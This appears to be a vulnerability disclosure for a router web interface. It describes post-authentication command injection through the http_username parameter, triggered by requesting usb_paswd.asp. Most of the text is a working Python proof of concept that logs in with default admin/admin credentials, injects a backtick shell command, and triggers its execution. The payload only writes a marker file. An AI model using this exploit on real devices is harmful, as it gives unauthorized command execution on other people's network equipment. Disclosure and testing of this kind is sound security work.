After the user maliciously constructs the parameter http_username, accessing the function usb_paswd_asp in the file usb_paswd.asp will cause post-authentication command injection. The attack can be launched remotely.

![image](https://github.com/user-attachments/assets/fc945338-d12a-49a0-a922-b13768e661f1)![image](https://github.com/user-attachments/assets/0965873e-426b-4a06-ad5a-552589f4b0d6)
Capture packets in the user management interface to modify the user name to malicious commands

![image](https://github.com/user-attachments/assets/72d3e973-9e38-4e72-bb19-c0b7a193a0a1)
![image](https://github.com/user-attachments/assets/890f217b-447c-4118-9924-57af0dca6074)

set username:\`echo HELLOWORLD > /tmp/hacked\`
![image](https://github.com/user-attachments/assets/46208859-b1cf-48cd-b0c3-04db399d752a)
payload = /usb_paswd.asp?share_enable=1&passwd=1&name=1

![image](https://github.com/user-attachments/assets/1d094768-7262-4af3-836b-e69294933fd2)

![image](https://github.com/user-attachments/assets/b8f8c4c5-1b62-43f3-90c6-8770d461ccdf)

#POC


```python
import requests

# POST /login.cgi HTTP/1.1
# Host: 192.168.0.1
# Content-Length: 25
# Cache-Control: max-age=0
# Upgrade-Insecure-Requests: 1
# Origin: http://192.168.0.1
# Content-Type: application/x-www-form-urlencoded
# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
# Referer: http://192.168.0.1/login.html
# Accept-Encoding: gzip, deflate, br
# Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-US;q=0.7
# Cookie: wys_userid=hello,wys_passwd=520E1BFD4CDE217D0A5824AE7EA60632
# Connection: close

# user=admin&password=admin
login_url = "http://192.168.0.1/login.cgi"  
login_headers = {
    "Host": "192.168.0.1",
    "Content-Length": "25",
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "http://192.168.0.1",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "http://192.168.0.1/login.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-US;q=0.7",
    "Cookie": "wys_userid=hello,wys_passwd=520E1BFD4CDE217D0A5824AE7EA60632",
    "Connection": "close"
}
login_data = {
    "user": "admin",
    "password": "admin"
}
response = requests.post(login_url, headers=login_headers, data=login_data)
print(response.text)

print("---------------------------------------------------------------------------------------------------")


# GET /webgl.asp?http_username=hello&exec_service=admin-restart&_=1726142513541 HTTP/1.1
# Host: 192.168.0.1
# Accept: application/json, text/javascript, */*
# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
# Referer: http://192.168.0.1/index.htm?_1420041819
# Accept-Encoding: gzip, deflate, br
# Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-US;q=0.7
# Cookie: wys_userid=admin,wys_passwd=520E1BFD4CDE217D0A5824AE7EA60632
# Connection: close

cmd = "`echo HELLOWORLD > /tmp/hacked`" 
burp0_url = f"http://192.168.0.1/webgl.asp?http_username={cmd}&exec_service=admin-restart&_=1726142513541"
burp0_headers = {
    "Host": "192.168.0.1",
    "Accept": "application/json, text/javascript, */*",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36",
    "Referer": "http://192.168.0.1/index.htm?_1420041819",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-US;q=0.7",
    "Cookie": "wys_userid=admin,wys_passwd=520E1BFD4CDE217D0A5824AE7EA60632",
    "Connection": "close"
}
response = requests.get(burp0_url, headers=burp0_headers)
print(response.text)

print("---------------------------------------------------------------------------------------------------")

# GET /usb_paswd.asp HTTP/1.1
# Host: 192.168.0.1
# Upgrade-Insecure-Requests: 1
# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
# Accept-Encoding: gzip, deflate, br
# Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-US;q=0.7
# Cookie: wys_userid=admin,wys_passwd=520E1BFD4CDE217D0A5824AE7EA60632
# Connection: close

burp1_url = "http://192.168.0.1/usb_paswd.asp?share_enable=1&passwd=1&name=1"
burp1_headers = {
    "Host": "192.168.0.1",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-US;q=0.7",
    "Cookie": "wys_userid=admin,wys_passwd=520E1BFD4CDE217D0A5824AE7EA60632",
    "Connection": "close"
}
response = requests.get(burp1_url, headers=burp1_headers)
print(response.text)
```
